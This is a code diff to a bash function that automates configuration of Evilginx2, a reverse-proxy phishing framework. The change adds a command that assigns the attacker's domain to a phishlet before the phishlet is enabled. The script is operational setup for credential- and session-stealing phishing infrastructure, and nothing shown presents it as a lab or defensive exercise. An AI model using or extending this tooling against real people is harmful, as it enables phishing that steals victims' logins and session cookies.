@@ -12,7 +12,6 @@ setup_evilginx() {
     done
     
     echo "Evilginx2 is running. Proceeding with configuration."
-    
     echo "Setting up Evilginx for domain: $domain_name"
     # Set up the hostname (domain or subdomain)
     #sudo evilginx config domain "$subdomain"
@@ -23,6 +22,8 @@ setup_evilginx() {
     config ip "$host_ip"    
     # Enable the phishlet
     #sudo evilginx phishlets enable $default_phishlet
+    phishlets hostname "$default_phishlet" "$domain_name"
+    
     if ! phishlets enable "$default_phishlet"; then
     echo "Failed to enable phishlet" >&2
     exit 1
